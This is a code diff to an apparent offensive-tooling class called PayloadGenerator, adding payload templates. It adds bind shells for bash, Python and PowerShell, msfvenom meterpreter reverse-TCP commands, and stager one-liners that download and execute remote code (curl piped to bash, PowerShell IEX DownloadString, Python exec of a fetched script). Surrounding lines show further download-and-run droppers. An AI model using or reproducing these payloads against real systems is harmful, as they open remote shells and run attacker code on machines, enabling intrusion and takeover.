@@ -95,6 +95,21 @@ export class PayloadGenerator {
         powershell: `$url="http://${h}:${p}/agent.exe";$out="$env:TEMP\\svc.exe";Invoke-WebRequest -Uri $url -OutFile $out;Start-Process $out`,
         python: `import urllib.request,os,subprocess\nurllib.request.urlretrieve("http://${h}:${p}/agent","/tmp/.a")\nos.chmod("/tmp/.a",0o755)\nsubprocess.Popen(["/tmp/.a"])`,
       },
+      bind_shell: {
+        bash: `while true;do nc -l -p ${p} -e /bin/bash;done`,
+        python: `import socket,subprocess\ns=socket.socket();s.bind(('0.0.0.0',${p}));s.listen(1);c,a=s.accept();subprocess.call(['/bin/sh','-i'],stdin=c,stdout=c,stderr=c)`,
+        powershell: `$l=[System.Net.Sockets.TcpListener]::new(${p});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}`,
+      },
+      meterpreter: {
+        bash: `# Generate with: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${h} LPORT=${p} -f elf -o /tmp/msf.elf && chmod +x /tmp/msf.elf && /tmp/msf.elf`,
+        powershell: `# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${h} LPORT=${p} -f exe -o meterpreter.exe`,
+        python: `# msfvenom -p python/meterpreter/reverse_tcp LHOST=${h} LPORT=${p} -f raw`,
+      },
+      stager: {
+        bash: `curl -s http://${h}:${p}/stage1 | bash`,
+        powershell: `IEX (New-Object Net.WebClient).DownloadString('http://${h}:${p}/stage1.ps1')`,
+        python: `exec(__import__('urllib.request').urlopen('http://${h}:${p}/stage1.py').read())`,
+      },
     };
 
     return templates[type]?.[lang] ?? `# ${type} payload for ${lang} — template not implemented\n# LHOST=${h} LPORT=${p}`;
